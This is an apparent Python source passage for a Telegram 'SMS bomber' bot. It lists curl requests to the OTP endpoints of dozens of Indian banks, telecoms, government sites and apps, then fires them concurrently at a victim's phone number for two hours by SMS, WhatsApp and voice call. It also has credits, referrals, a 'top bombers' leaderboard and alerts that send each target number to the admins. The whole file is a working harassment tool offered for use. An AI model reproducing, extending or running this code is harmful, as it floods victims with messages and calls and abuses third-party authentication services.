curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://csb.co.in/v1/user/otplogin'
# WhatsApp - Kerala Gramin
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://keralagbank.com/v1/user/otplogin'
# WhatsApp - Airtel Thanks
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://airtel.in/thanks/gw/login-register/v1/sendOTP'
# WhatsApp - Jio
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://jio.com/gw/login-register/v1/sendOTP'
# WhatsApp - Vi
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://myvi.in/gw/login-register/v1/sendOTP'
# WhatsApp - Airtel DTH
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://airtel.in/dth/gw/login-register/v1/sendOTP'
# WhatsApp - Jio Fiber
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://jio.com/fiber/gw/login-register/v1/sendOTP'
# WhatsApp - Hathway
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://hathway.com/gw/login-register/v1/sendOTP'
# WhatsApp - Indraprastha
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://iglonline.net/gw/login-register/v1/sendOTP'
# WhatsApp - Bharat Gas
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://bharatgas.com/gw/login-register/v1/sendOTP'
# WhatsApp - Chennai Metro
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://chennaimetrowater.com/gw/login-register/v1/sendOTP'
# WhatsApp - Swachh Bharat
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://swachhbharatmission.gov.in/gw/login-register/v1/sendOTP'
# WhatsApp - PMAY
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://pmaymis.gov.in/gw/login-register/v1/sendOTP'
# WhatsApp - GST
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://gst.gov.in/gw/login-register/v1/sendOTP'
# WhatsApp - PAN Card
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://protean-tinpan.com/gw/login-register/v1/sendOTP'
# WhatsApp - SpiceJet
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://spicejet.com/gw/login-register/v1/sendOTP'
# WhatsApp - KPN Fresh WEB
curl -X POST -H 'content-type: application/json' -H 'x-app-id: d7547338-c70e-4130-82e3-1af74eda6797' -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36' -H 'origin: https://www.kpnfresh.com' -H 'referer: https://www.kpnfresh.com/' -d '{"phone_number":{"number":"{phone}","country_code":"+91"}}' 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0'
# WhatsApp - Swiggy
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","isWhatsapp":true}' 'https://profile.swiggy.com/api/v3/app/request_otp'
# WhatsApp - Zomato
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","whatsapp":true}' 'https://www.zomato.com/php/asyncLogin.php'
# WhatsApp - Lenskart
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","isWhatsapp":true}' 'https://api.lenskart.com/v1/auth/otp'
# WhatsApp - Bewakoof
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://api.bewakoof.com/api/v1.0/user/whatsapp_otp'
"""

def parse_curl_apis(raw_text: str) -> List[Dict]:
    apis = []
    lines = raw_text.strip().splitlines()
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if line.startswith('#'):
            name = line[1:].strip()
            i += 1
            curl_parts = []
            while i < len(lines) and not lines[i].strip().startswith('#'):
                cleaned = lines[i].strip()
                if cleaned:
                    curl_parts.append(cleaned)
                i += 1
            if not curl_parts:
                continue
            curl_cmd = ' '.join(curl_parts)
            method = 'GET'
            parts = curl_cmd.split()
            for idx, part in enumerate(parts):
                if part == '-X' and idx + 1 < len(parts):
                    method = parts[idx + 1].upper()
                    break
            all_urls = re.findall(r"https?://[^\s\"'<>]+", curl_cmd)
            url = all_urls[-1] if all_urls else ""
            if not url:
                continue
            headers = {}
            for key, value in re.findall(r"-H '([^:]+):\s*([^']+)'", curl_cmd):
                headers[key.strip()] = value.strip()
            for key, value in re.findall(r'-H "([^:]+):\s*([^"]+)"', curl_cmd):
                headers[key.strip()] = value.strip()
            data = None
            dm = re.search(r"-d '([^']+)'", curl_cmd)
            if dm:
                data = dm.group(1)
            else:
                dm = re.search(r'-d "([^"]+)"', curl_cmd)
                if dm:
                    data = dm.group(1)
            category = 'sms'
            name_lower = name.lower()
            if 'voice' in name_lower or 'call' in name_lower:
                category = 'voice'
            elif 'whatsapp' in name_lower:
                category = 'whatsapp'
            apis.append({
                'name': name, 'url': url, 'method': method,
                'headers': headers, 'data': data, 'category': category,
            })
        else:
            i += 1
    return apis

parsed_apis = parse_curl_apis(RAW_APIS)
SMS_APIS = [api for api in parsed_apis if api['category'] == 'sms']
VOICE_APIS = [api for api in parsed_apis if api['category'] == 'voice']
WHATSAPP_APIS = [api for api in parsed_apis if api['category'] == 'whatsapp']
ALL_APIS = parsed_apis

# ==================== BOMBER ====================
class SMSBomber:
    def __init__(self):
        self.active_bombs = {}
        self.stats_lock = threading.Lock()
        self.stop_events = {}
        self.bomb_modes = {}

    async def send_request(self, session: aiohttp.ClientSession, api: Dict, phone: str):
        api_name = api.get("name", "Unknown")
        try:
            url = api["url"].replace("{phone}", phone) if "{phone}" in api["url"] else api["url"]
            data = None
            if api["data"]:
                data = api["data"].replace("{phone}", phone) if "{phone}" in api["data"] else api["data"]
            headers = api.get("headers", {})
            timeout_obj = aiohttp.ClientTimeout(total=15)
            if api["method"] == "GET":
                async with session.get(url, headers=headers, timeout=timeout_obj) as resp:
                    ts = datetime.now().strftime("%H:%M:%S")
                    icon = "✅" if resp.status < 400 else "❌"
                    print(f"[{ts}] {icon} {api['method']} {api_name} → {resp.status}")
                    return resp.status
            else:
                async with session.post(url, data=data, headers=headers, timeout=timeout_obj) as resp:
                    ts = datetime.now().strftime("%H:%M:%S")
                    icon = "✅" if resp.status < 400 else "❌"
                    print(f"[{ts}] {icon} {api['method']} {api_name} → {resp.status}")
                    return resp.status
        except Exception as e:
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] 🔴 {api.get('method', '?')} {api_name} → FAILED ({type(e).__name__})")
            return None

    async def _bomb_voice(self, session, apis, phone, bomb_id, stop_event, start_time):
        max_duration = 7200
        while not stop_event.is_set() and (time.time() - start_time) < max_duration:
            try:
                tasks = [self.send_request(session, api, phone) for api in apis]
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    successful = sum(1 for r in results if isinstance(r, int) and r < 400)
                    if successful > 0:
                        with self.stats_lock:
                            update_bomb_stats(bomb_id, calls=successful)
                await asyncio.sleep(0)
            except Exception:
                continue

    async def _bomb_messages(self, session, sms_apis, wa_apis, phone, bomb_id, stop_event, start_time):
        total_sms = len(sms_apis)
        total_wa = len(wa_apis)
        total_msg = total_sms + total_wa
        max_duration = 7200
        while not stop_event.is_set() and (time.time() - start_time) < max_duration:
            try:
                tasks = [self.send_request(session, api, phone) for api in sms_apis]
                tasks += [self.send_request(session, api, phone) for api in wa_apis]
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    successful = sum(1 for r in results if isinstance(r, int) and r < 400)
                    if successful > 0 and total_msg > 0:
                        sms_count = int(successful * (total_sms / total_msg)) if total_sms else 0
                        wa_count = successful - sms_count
                        with self.stats_lock:
                            update_bomb_stats(bomb_id, sms=sms_count, whatsapp=wa_count)
                await asyncio.sleep(0.01) # HIGH SPEED
            except Exception:
                continue

    async def bomb_number(self, phone, bomb_id, user_id, mode='all'):
        stop_event = threading.Event()
        self.stop_events[user_id] = stop_event
        mode_apis = {
            'all':      {'sms': SMS_APIS, 'whatsapp': WHATSAPP_APIS, 'voice': VOICE_APIS},
            'sms':      {'sms': SMS_APIS, 'whatsapp': [], 'voice': []},
            'whatsapp': {'sms': [], 'whatsapp': WHATSAPP_APIS, 'voice': []},
            'voice':    {'sms': [], 'whatsapp': [], 'voice': VOICE_APIS},
        }
        selected = mode_apis.get(mode, mode_apis['all'])
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            start_time = time.time()
            if selected['voice']:
                tasks.append(self._bomb_voice(session, selected['voice'], phone, bomb_id, stop_event, start_time))
            if selected['sms'] or selected['whatsapp']:
                tasks.append(self._bomb_messages(session, selected['sms'], selected['whatsapp'], phone, bomb_id, stop_event, start_time))
            if tasks:
                await asyncio.gather(*tasks)
        if user_id in self.stop_events:
            del self.stop_events[user_id]
        end_bomb(bomb_id)

bot = TeleBot(BOT_TOKEN)
bomber = SMSBomber()
active_sessions = {}
bomb_modes = {}

def check_channel_membership(user_id: int) -> bool:
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ('member', 'administrator', 'creator')
    except Exception:
        return False

def format_time(seconds: int) -> str:
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def create_progress_bar(percentage: int, length: int = 10) -> str:
    filled = int(length * percentage / 100)
    empty = length - filled
    return "🟩" * filled + "⬜" * empty

def get_user_stats(user_id: int) -> Optional[Dict]:
    user = get_user(user_id)
    if not user:
        return None
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM bombs WHERE user_id = ?', (user_id,))
        total_bombs = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ? AND credit_claimed = 1', (user_id,))
        successful_refs = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ? AND credit_claimed = 0', (user_id,))
        pending_refs = cursor.fetchone()[0]
        cursor.execute('SELECT COALESCE(SUM(sms_sent), 0) FROM bombs WHERE user_id = ?', (user_id,))
        total_sms = cursor.fetchone()[0]
        cursor.execute('SELECT COALESCE(SUM(calls_made), 0) FROM bombs WHERE user_id = ?', (user_id,))
        total_calls = cursor.fetchone()[0]
        cursor.execute('SELECT COALESCE(SUM(whatsapp_sent), 0) FROM bombs WHERE user_id = ?', (user_id,))
        total_whatsapp = cursor.fetchone()[0]
    return {
        'credits': user[4],
        'total_bombs': total_bombs,
        'successful_refs': successful_refs,
        'pending_refs': pending_refs,
        'join_date': user[6],
        'total_sms': total_sms,
        'total_calls': total_calls,
        'total_whatsapp': total_whatsapp,
    }

def get_referral_link(user_id: int) -> str:
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref{user_id}"

# ==================== HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    if is_banned_guard(user_id): return

    username = message.from_user.username or ""
    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""

    referred_by = None
    if len(message.text.split()) > 1 and message.text.split()[1].startswith('ref'):
        try:
            referred_by = int(message.text.split()[1][3:])
            if referred_by != user_id and get_user(referred_by):
                add_referral(referred_by, user_id)
        except (ValueError, IndexError):
            pass

    create_user(user_id, username, first_name, last_name, referred_by)

    if not check_channel_membership(user_id):
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("✅ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_ID[1:]}", style="primary"))
        keyboard.add(InlineKeyboardButton("✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_membership", style="success"))
        bot.send_message(
            message.chat.id,
            f"{P_WAVE} Welcome <b>{esc(first_name)}</b> to <b>{BRAND_NAME}</b>! {P_HEART}\n\n"
            f"{P_MEGA} To use this bot, please join our channel first:\n"
            f"<code>{CHANNEL_ID}</code>\n\n"
            f"{P_CHECK} After joining, click 'I've Joined' button below.\n\n"
            f"{P_DEV} Developer: {DEV_NAME}",
            parse_mode='HTML',
            reply_markup=keyboard,
        )
        for admin_id in ADMIN_IDS:
            try:
                bot.send_message(
                    admin_id,
                    f"{P_NEW} <b>New user started bot:</b>\n"
                    f"{P_USER} Name: {esc(first_name)} {esc(last_name)}\n"
                    f"{P_MOBILE} Username: @{esc(username)}\n"
                    f"🆔 ID: <code>{user_id}</code>\n"
                    f"{P_CLOCK} Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                    parse_mode='HTML',
                )
            except Exception:
                pass
    else:
        approve_user(user_id)
        show_main_menu(message)

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def handle_membership_check(call):
    user_id = call.from_user.id
    if check_channel_membership(user_id):
        approve_user(user_id)
        bot.answer_callback_query(call.id, "✅ Verified! Welcome!")
        bot.send_message(call.message.chat.id, f"{P_COOL} Verified! Welcome! {P_LOVE}", parse_mode='HTML')
        show_main_menu(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ Please join the channel first!")

def show_main_menu(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user[7]:
        handle_start(message)
        return
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💣 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ", callback_data="start_bombing", style="danger"),
        InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ʙᴏᴍʙɪɴɢ", callback_data="stop_bombing", style="danger"),
    )
    keyboard.add(
        InlineKeyboardButton("📊 ᴩʀᴏꜰɪʟᴇ", callback_data="profile", style="primary"),
        InlineKeyboardButton("📈 ʀᴇꜰᴇʀʀᴀʟ", callback_data="referral", style="primary"),
    )
    keyboard.add(
        InlineKeyboardButton("🆘 ʜᴇʟᴩ", callback_data="help", style="success"),
        InlineKeyboardButton("📞 ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ", callback_data="contact_admin", style="success"),
    )
    keyboard.add(InlineKeyboardButton("🏆 ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", callback_data="leaderboard", style="success"))
    keyboard.add(InlineKeyboardButton("🎟️ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ", callback_data="redeem_info", style="primary"))
    
    if user_id in ADMIN_IDS:
        keyboard.add(InlineKeyboardButton("👑 ᴀᴅᴍɪɴ ᴩᴀɴᴇʟ", callback_data="admin_panel", style="danger"))

    active_count = sum(1 for s in active_sessions.values() if s.get('is_active'))
    total_apis = len(SMS_APIS) + len(WHATSAPP_APIS) + len(VOICE_APIS)

    bot.send_message(
        message.chat.id,
        f"{P_FIRE} <b>{BRAND_NAME}</b> {P_COOL}\n\n"
        f"{P_USER} User: {esc(message.from_user.first_name)}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"{P_DIAMOND} Credits: <b>{user[4]}</b> {P_STAR2}\n\n"
        f"{P_STAR} <b>Powerful Features:</b>\n"
        f"• {P_LIGHTNING} {total_apis}+ APIs for maximum impact\n"
        f"• {P_MODE} Multi-mode: SMS, WhatsApp, Voice\n"
        f"• {P_CLOCK} 2 hours duration\n"
        f"• {P_CHART} Real-time tracking\n"
        f"• {P_BOMB} Active bombs: {active_count}\n\n"
        f"{P_INFO} <b>Available Commands:</b>\n"
        f"• /start - Restart bot\n"
        f"• /profile - Your stats\n"
        f"• /refer - Get referral link\n"
        f"• /credits - Check credits\n"
        f"• /help - Show help\n\n"
        f"{P_DEV} Developer: {DEV_NAME}",
        parse_mode='HTML',
        reply_markup=keyboard,
    )

@bot.callback_query_handler(func=lambda call: call.data == "start_bombing")
def handle_start_bombing(call):
    user_id = call.from_user.id
    if is_banned_guard(user_id):
        bot.answer_callback_query(call.id, "❌ You are banned!")
        return
    user = get_user(user_id)
    if not user:
        bot.answer_callback_query(call.id, "❌ User not found!")
        return
    if user[4] <= 0:
        bot.answer_callback_query(call.id, "❌ Not enough credits! Use /refer to get more.")
        bot.send_message(call.message.chat.id, f"{P_SAD} Not enough credits! Use /refer to get more.", parse_mode='HTML')
        return
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💥 ᴀʟʟ ᴏᴜᴛ", callback_data="mode_all", style="danger"),
        InlineKeyboardButton("📱 ꜱᴍꜱ ᴏɴʟʏ", callback_data="mode_sms", style="primary"),
        InlineKeyboardButton("💬 ᴡʜᴀᴛꜱᴀᴩᴩ ᴏɴʟʏ", callback_data="mode_whatsapp", style="primary"),
        InlineKeyboardButton("📞 ᴠᴏɪᴄᴇ ᴏɴʟʏ", callback_data="mode_voice", style="primary"),
    )
    keyboard.add(InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ", callback_data="cancel_bombing"))
    bot.send_message(
        call.message.chat.id,
        f"{P_MODE} <b>Select Bombing Mode</b> — {BRAND_NAME} {P_THINK}\n\n"
        f"• {P_EXPLOSION} All Out: SMS + WhatsApp + Voice\n"
        f"• {P_MOBILE} SMS Only: SMS APIs\n"
        f"• {P_CHAT} WhatsApp Only: WhatsApp APIs\n"
        f"• {P_PHONE} Voice Only: Voice call APIs\n\n"
        f"{P_ALERT} Choose wisely, credit will be deducted once started.",
        parse_mode='HTML',
        reply_markup=keyboard,
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def handle_mode_selection(call):
    user_id = call.from_user.id
    mode = call.data.split("_")[1]
    bomb_modes[user_id] = mode
    msg = bot.send_message(
        call.message.chat.id,
        f"{P_TARGET} <b>Enter Target Number</b>\n\n"
        f"{P_MODE} Selected mode: <b>{mode.upper()}</b>\n"
        f"{P_MOBILE} Send me the 10-digit phone number (without +91)\n"
        f"{P_PIN} Example: <code>9876543210</code>\n\n"
        f"{P_CROSS} Type /cancel to abort\n\n"
        f"{BRAND_NAME} — {DEV_NAME}",
        parse_mode='HTML',
    )
    bot.register_next_step_handler(msg, process_target_number)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "cancel_bombing")
def handle_cancel_bombing(call):
    bot.answer_callback_query(call.id, "❌ Cancelled.")
    bot.send_message(call.message.chat.id, f"❌ Bombing cancelled. — {BRAND_NAME}")

def process_target_number(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ Bombing cancelled.")
        return
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        bot.send_message(
            message.chat.id,
            f"{P_SAD} <b>Invalid phone number!</b> Please send a valid 10-digit number.\n"
            f"{P_PIN} Example: <code>9876543210</code>",
            parse_mode='HTML',
        )
        bot.register_next_step_handler(message, process_target_number)
        return
    user_id = message.from_user.id
    user = get_user(user_id)
    update_user_credits(user_id, -1)
    mode = bomb_modes.get(user_id, 'all')
    start_bombing(user_id, phone, message.chat.id, mode)
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🛑 ꜱᴛᴏᴩ ʙᴏᴍʙɪɴɢ", callback_data=f"stop_{user_id}", style="danger"))
    bot.send_message(
        message.chat.id,
        f"{P_ROCKET} <b>DESTRUCTION STARTED!</b> {P_LAUGH}\n\n"
        f"{P_TARGET} Target: <code>{phone}</code>\n"
        f"{P_MODE} Mode: <b>{mode.upper()}</b>\n"
        f"{P_CLOCK} Duration: 2 hours\n"
        f"{P_DIAMOND} Credits left: <b>{user[4] - 1}</b>\n"
        f"{P_LIGHTNING} Speed: Voice=FullSpeed | SMS/WA=0.5s\n\n"
        f"{P_STAR} <b>Active APIs:</b>\n"
        f"• {P_MOBILE} SMS: {len(SMS_APIS)} APIs\n"
        f"• {P_CHAT} WhatsApp: {len(WHATSAPP_APIS)} APIs\n"
        f"• {P_PHONE} Voice: {len(VOICE_APIS)} APIs\n\n"
        f"{P_DURATION} Bombing in progress...\n"
        f"{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
        reply_markup=keyboard,
    )

def start_bombing(user_id: int, phone: str, chat_id: int, mode: str):
    bomb_id = add_bomb_record(user_id, phone)
    active_sessions[user_id] = {
        'bomb_id': bomb_id, 'chat_id': chat_id, 'start_time': time.time(),
        'phone': phone, 'is_active': True, 'mode': mode,
    }
    def run_bombing():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(bomber.bomb_number(phone, bomb_id, user_id, mode))
        finally:
            loop.close()
            if user_id in active_sessions:
                active_sessions[user_id]['is_active'] = False
    threading.Thread(target=run_bombing, daemon=True).start()
    for admin_id in ADMIN_IDS:
        try:
            user_info = get_user(user_id)
            uname = user_info[1] if user_info else "Unknown"
            fname = user_info[2] if user_info else "Unknown"
            bot.send_message(
                admin_id,
                f"{P_FLAG} <b>NEW BOMBING STARTED</b> {P_WOW}\n\n"
                f"{P_USER} User: {esc(fname)} (@{esc(uname)})\n"
                f"🆔 ID: <code>{user_id}</code>\n"
                f"{P_TARGET} Target: <code>{phone}</code>\n"
                f"{P_MODE} Mode: {mode.upper()}\n"
                f"{P_CLOCK} Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"{BRAND_NAME} | {DEV_NAME}",
                parse_mode='HTML',
            )
        except Exception:
            pass
    threading.Thread(target=send_progress_updates, args=(user_id, chat_id, phone, bomb_id, mode), daemon=True).start()

def send_progress_updates(user_id, chat_id, phone, bomb_id, mode):
    start_time = time.time()
    max_duration = 2 * 3600
    update_interval = 5
    message_id = None
    for _ in range(max_duration // update_interval):
        if user_id not in active_sessions or not active_sessions[user_id]['is_active']:
            break
        elapsed = time.time() - start_time
        remaining = max_duration - elapsed
        if remaining <= 0:
            break
        percentage = (elapsed / max_duration) * 100
        progress_bar = create_progress_bar(percentage)
        with sqlite3.connect(DB_NAME) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT sms_sent, calls_made, whatsapp_sent FROM bombs WHERE bomb_id = ?', (bomb_id,))
            stats = cursor.fetchone()
        if stats:
            sms, calls, whatsapp = stats
            sms_rate = int(sms / elapsed) if elapsed > 0 else 0
            call_rate = int(calls / elapsed) if elapsed > 0 else 0
            whatsapp_rate = int(whatsapp / elapsed) if elapsed > 0 else 0
            mode_label = {'all': 'SMS + WhatsApp + Voice', 'sms': 'SMS Only',
                          'whatsapp': 'WhatsApp Only', 'voice': 'Voice Only'}.get(mode, 'All')
            msg_text = (
                f"{P_FIRE} <b>BOMBING IN PROGRESS</b> {P_ROCKET}\n\n"
                f"{P_TARGET} Target: <code>{phone}</code>\n"
                f"{P_MODE} Mode: {mode_label}\n"
                f"{P_CLOCK} Time left: {format_time(int(remaining))}\n"
                f"{P_PROFILE} Progress: {progress_bar} {percentage:.1f}%\n\n"
                f"{P_CHART} <b>Statistics:</b>\n"
                f"• {P_MOBILE} SMS Sent: {sms:,}\n"
                f"• {P_PHONE} Calls Made: {calls:,}\n"
                f"• {P_CHAT} WhatsApp: {whatsapp:,}\n\n"
                f"{P_LIGHTNING} <b>Current Rate:</b>\n"
                f"• {sms_rate} SMS/sec\n"
                f"• {whatsapp_rate} WhatsApp/sec\n"
                f"• {call_rate} Calls/sec\n\n"
                f"{BRAND_NAME} | {DEV_NAME}"
            )
            try:
                if message_id is None:
                    msg = bot.send_message(chat_id, msg_text, parse_mode='HTML')
                    message_id = msg.message_id
                else:
                    bot.edit_message_text(msg_text, chat_id, message_id, parse_mode='HTML')
            except Exception:
                pass
        time.sleep(update_interval)
    if user_id in active_sessions and active_sessions[user_id]['is_active']:
        with sqlite3.connect(DB_NAME) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT sms_sent, calls_made, whatsapp_sent FROM bombs WHERE bomb_id = ?', (bomb_id,))
            final_stats = cursor.fetchone()
        if final_stats:
            sms, calls, whatsapp = final_stats
            total_attacks = sms + calls + whatsapp
            bot.send_message(
                chat_id,
                f"{P_CHECK} <b>BOMBING COMPLETED</b> {P_CLAP} {P_TROPHY}\n\n"
                f"{P_TARGET} Target: <code>{phone}</code>\n"
                f"{P_CLOCK} Duration: 2 hours\n"
                f"{P_PROFILE} Total Attacks: <b>{total_attacks:,}</b>\n"
                f"• {P_MOBILE} SMS: {sms:,}\n"
                f"• {P_PHONE} Calls: {calls:,}\n"
                f"• {P_CHAT} WhatsApp: {whatsapp:,}\n\n"
                f"{P_DIAMOND} Credits used: 1\n"
                f"{P_INFO} Check /profile for detailed stats.\n\n"
                f"{BRAND_NAME} | {DEV_NAME}",
                parse_mode='HTML',
            )
        if user_id in bomber.stop_events:
            bomber.stop_events[user_id].set()
        active_sessions[user_id]['is_active'] = False

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_bombing(call):
    try:
        user_id = int(call.data.split("_")[1])
        if user_id in bomber.stop_events:
            bomber.stop_events[user_id].set()
            bot.answer_callback_query(call.id, "✅ Bombing stopped!")
            bot.send_message(call.message.chat.id, f"🛑 Bombing session stopped. — {BRAND_NAME}")
        else:
            bot.answer_callback_query(call.id, "❌ No active bombing session!")
    except Exception:
        bot.answer_callback_query(call.id, "❌ Error stopping bombing!")

@bot.callback_query_handler(func=lambda call: call.data == "profile")
def handle_profile(call):
    user_id = call.from_user.id
    stats = get_user_stats(user_id)
    if not stats:
        bot.answer_callback_query(call.id, "❌ User not found!")
        return
    total_attacks = stats['total_sms'] + stats['total_calls'] + stats['total_whatsapp']
    bot.send_message(
        call.message.chat.id,
        f"{P_PROFILE} <b>YOUR PROFILE</b> {P_COOL}\n\n"
        f"{P_USER} User ID: <code>{user_id}</code>\n"
        f"{P_DIAMOND} Credits: <b>{stats['credits']}</b> {P_STAR2}\n"
        f"{P_BOMB} Total Bombs: <b>{stats['total_bombs']}</b>\n"
        f"{P_TARGET} Total Attacks: <b>{total_attacks:,}</b> {P_CLAP}\n\n"
        f"{P_CHART} <b>Detailed Stats:</b>\n"
        f"• {P_MOBILE} SMS Sent: {stats['total_sms']:,}\n"
        f"• {P_PHONE} Calls Made: {stats['total_calls']:,}\n"
        f"• {P_CHAT} WhatsApp: {stats['total_whatsapp']:,}\n\n"
        f"{P_INBOX} <b>Referral System:</b>\n"
        f"• {P_CHECK} Successful: {stats['successful_refs']}\n"
        f"• {P_DURATION} Pending: {stats['pending_refs']}\n"
        f"{P_CALENDAR} Joined: {stats['join_date'].split()[0]}\n\n"
        f"{P_HEART} <b>Get More Credits:</b>\n"
        f"Use /refer to get your referral link\n\n"
        f"{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "referral")
def handle_referral(call):
    user_id = call.from_user.id
    ref_link = get_referral_link(user_id)
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📤 ꜱʜᴀʀᴇ ʟɪɴᴋ", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20SMS%20bomber%20bot!", style="primary"))
    keyboard.add(InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_to_menu"))
    bot.send_message(
        call.message.chat.id,
        f"{P_TROPHY} <b>REFERRAL SYSTEM</b> {P_GIFT}\n\n"
        f"{P_LINK} Your referral link:\n<code>{ref_link}</code>\n\n"
        f"{P_STAR} <b>How it works:</b>\n"
        f"1. {P_SHARE} Share your link with friends\n"
        f"2. When they join using your link\n"
        f"3. {P_DIAMOND} You get <b>1 credit</b> automatically\n"
        f"4. They get 2 starting credits\n\n"
        f"{P_GIFT} <b>Your Benefits:</b>\n"
        f"• Unlimited credits potential\n"
        f"• {P_PROFILE} Track referrals in /profile\n"
        f"• Credits added instantly\n\n"
        f"{P_ALERT} <b>Note:</b> Credits are deducted when bombing starts, even if stopped early.\n\n"
        f"{BRAND_NAME} | {DEV_NAME}",
        parse_mode='HTML',
        reply_markup=keyboard,
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
def handle_leaderboard(call):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT u.user_id, u.username, u.first_name,
                   (COALESCE(SUM(b.sms_sent),0)+COALESCE(SUM(b.calls_made),0)+COALESCE(SUM(b.whatsapp_sent),0)) as total
            FROM users u
            LEFT JOIN bombs b ON u.user_id = b.user_id
            GROUP BY u.user_id
            ORDER BY total DESC
            LIMIT 10
        ''')
        top = cursor.fetchall()
    if not top:
        bot.send_message(call.message.chat.id, f"No data yet. — {BRAND_NAME}")
        bot.answer_callback_query(call.id)
        return
    medals = [P_MEDAL1, P_MEDAL2, P_MEDAL3]
    msg = f"{P_TROPHY} <b>LEADERBOARD — TOP BOMBERS</b> {P_CLAP}\n\n"
    for idx, (uid, uname, fname, total) in enumerate(top, 1):
        medal = medals[idx-1] if idx <= 3 else f"{idx}."
        name = esc(fname or f"User {uid}")
        ud = f"@{esc(uname)}" if uname else ""
        msg += f"{medal} {name} {ud}\n   {P_TARGET} Attacks: {total:,}\n\n"
    bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "help")
def handle_help(call):
    bot.send_message(
        call.message.chat.id,
        f"{P_SOS} <b>HELP & GUIDE</b> — {BRAND_NAME} {P_THINK}\n\n"
        f"{P_STAR} <b>How to use:</b>\n"
        f"1. Join our channel (required)\n"
        f"2. Use /start to begin\n"
